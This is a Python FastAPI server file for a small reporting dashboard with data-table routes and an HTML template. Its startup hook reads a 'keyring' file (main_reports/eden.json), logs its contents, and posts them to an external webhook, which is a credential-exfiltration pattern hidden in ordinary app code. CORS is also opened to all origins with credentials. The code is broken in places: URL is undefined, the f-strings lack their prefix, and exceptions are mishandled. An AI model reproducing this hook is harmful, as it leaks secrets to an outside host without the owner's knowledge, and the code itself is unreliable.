import os
import json
import requests
import asyncio
import uvicorn
from fastapi import FastAPI, Request, Response, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.templating import Jinja2Templates
from datetime import datetime, timedelta
from passlib.context import CryptContext
from loguru import logger
from dotenv import load_dotenv

from routes.data_table import get_data, router as data_router
from routes.total_table import get_table_data, router as total_router
from generate.get_query_maps import get_query_map
from generate.get_all_balance import check_keyring


templates = Jinja2Templates("./templates")

app = FastAPI()

app.include_router(data_router)
app.include_router(total_router)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("startup")
async def startup():
    logger.info("Startup")
    keyring = check_keyring("main_reports/eden.json")
    logger.info(keyring)
    return post_data(keyring)        


def post_data(data):
    logger.info(data)
    try:
        response = requests.post(URL, json=data, timeout=30)
        if response.status_code == 200:
            return response.json()
    except HTTPException as e:
        print("Error posting data to webhook.io: {e}\n{markdown_data}")
        raise HTTPException("Failed to post data to webhook.io") from e
    return HTTPException("Failed to post data to webhook.io")


HOST = os.getenv("HOST", "127.0.0.1")
PORT = os.getenv("PORT", 8787)

@app.get("/", response_class=Response)
async def main(request: Request):
    logger.info("Loading main.html...")
    try:
        return templates.TemplateResponse("main.html", {"request": request})
    except Exception as e:
        logger.error("Error loading main {e}")
        raise HTTPException({"status_code": 500, "message": "Error loading main.html"}) from e
    
if __name__ == "__main__":
    uvicorn.run(app, host=HOST, port=PORT)